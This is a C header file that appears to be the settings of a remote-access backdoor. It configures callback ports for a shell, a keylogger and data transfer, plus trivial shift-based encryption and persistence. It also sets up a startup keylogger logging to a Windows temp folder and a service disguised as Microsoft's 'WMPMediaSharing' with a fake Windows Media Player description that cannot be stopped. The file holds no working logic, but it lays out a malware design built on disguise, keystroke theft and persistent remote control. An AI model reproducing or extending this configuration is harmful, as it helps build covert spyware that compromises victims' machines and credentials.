#ifndef MAIN_H
#define MAIN_H

// settings

// both
//#define HOST_IP "127.0.0.1" //obf
#define HOST_PORT 31337
#define HOST_PORT_SENDRECV 31338
#define HOST_PORT_KEYLOG 31339
#define HOST_PORT_OUTPUT 33340
#define HOST_PORT_DEBUG 33341
// note: max port num is 65535
#define ENABLE_ENCRYPTION 1
#define ENCRYPTION_SHIFT_NUM 69
#define RECV_TIMEOUT 5000
#define PING_DELAY RECV_TIMEOUT/2
#define PING_STRING "********************"

// shell
#define SHELL_SHOW_BANNER 1
#define SHELL_SERVICE_SLEEP 1000
#define SHELL_RETRY_MS 1000
#define SHELL_ENSURE_PERSISTENCY 1
//#define SHELL_STARTUP_SETTINGS_FILENAME "C:\\Windows\\Temp\\set.ini" //obf
#define SHELL_STARTUP_KEYLOGGER 1
//#define SHELL_STARTUP_KEYLOGGER_FILENAME "C:\\Windows\\Temp\\keys.log" //obf
#define SHELL_SERVICE_NAME "WMPMediaSharing"
#define SHELL_SERVICE_DISPLAYNAME "WMPMediaSharing"
#define SHELL_SERVICE_DESCRIPTION "This service enables the Windows Media Player Sharing Interface."
#define SHELL_SERVICE_ALLOWSTOP 0
#define SHELL_MASK 1

// server
#define MAX_CONNS 9000

#include "debug.h"

#if DEBUG
#undef SHELL_MASK
#define SHELL_MASK 0
#endif

#endif